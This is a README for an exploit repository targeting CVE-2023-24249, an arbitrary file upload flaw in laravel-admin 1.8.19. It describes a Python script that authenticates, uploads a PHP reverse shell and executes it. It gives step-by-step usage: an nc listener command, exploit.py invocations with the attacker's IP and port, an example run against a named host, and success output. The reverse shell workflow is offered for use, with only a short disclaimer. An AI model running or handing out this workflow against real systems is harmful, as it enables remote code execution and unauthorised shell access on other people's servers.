# CVE-2023-24249 Exploit Script

## Description

This repository contains an exploit script for CVE-2023-24249, a critical vulnerability found in `laravel-admin` version 1.8.19. This vulnerability allows for arbitrary file upload, enabling attackers to execute arbitrary code via a crafted PHP file. The exploit demonstrates how an attacker can upload a reverse shell to the target application and execute it to gain remote access.

## Vulnerability Details

**CVE-2023-24249** is an arbitrary file upload vulnerability in `laravel-admin` v1.8.19. This vulnerability allows attackers to upload and execute arbitrary PHP files, leading to potential remote code execution.

- **Base Score**: 7.2 HIGH
- **Vector**: [CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H](https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H)
- **Weakness Enumeration**: CWE-434 - Unrestricted Upload of File with Dangerous Type

## References

- [Exploit - Third Party Advisory](https://flyd.uk/post/cve-2023-24249/)
- [Laravel Admin GitHub Repository](https://github.com/z-song/laravel-admin)
- [Laravel Admin Official Website](https://laravel-admin.org/)

## Exploit Script

The provided exploit script automates the process of exploiting CVE-2023-24249. It performs the following steps:
1. **Authenticate**: Logs into the target application using provided credentials.
2. **Upload Reverse Shell**: Uploads a PHP reverse shell script through the vulnerable file upload functionality.
3. **Execute Reverse Shell**: Sends a GET request to the uploaded reverse shell script to execute it and establish a connection back to the attacker's machine.

## Requirements

- Python 3
- `requests` library
- `beautifulsoup4` library

Install the required libraries using pip:
```sh
pip install requests beautifulsoup4
```

## Usage

1. **Clone the repository**:
    ```sh
    git clone https://github.com/IDUZZEL/CVE-2023-24249-Exploit.git
    cd CVE-2023-24249-Exploit
    ```

2. **Start a listener on your machine**:
    ```sh
    nc -lvnp <PORT>
    ```

3. **Run the exploit script**:
    ```sh
    python3 exploit.py -u <TARGET_URL> -U <USERNAME> -P <PASSWORD> -i <YOUR_IP> -p <YOUR_PORT>
    ```

    Replace `<TARGET_URL>`, `<USERNAME>`, `<PASSWORD>`, `<YOUR_IP>`, and `<YOUR_PORT>` with the appropriate values:
    - `<TARGET_URL>`: The URL of the target application.
    - `<USERNAME>`: The username for authentication.
    - `<PASSWORD>`: The password for authentication.
    - `<YOUR_IP>`: Your IP address to receive the reverse shell connection.
    - `<YOUR_PORT>`: The port on which your listener is running.

## Example

```sh
python3 exploit.py -u http://admin.iduzzel.com -U admin -P iduzzel -i 10.10.14.13 -p 1337
```

## Script Output

If the exploit is successful, the script will output:
```sh
[+] Reverse shell uploaded successfully! Attempting to execute it...
[+] Reverse shell executed successfully! Check your listener at <YOUR_IP>:<YOUR_PORT>
```

## Disclaimer

This script is intended for educational purposes only. Unauthorized use of this script against any system without explicit permission is illegal and unethical. The author is not responsible for any misuse or damage caused by this script.
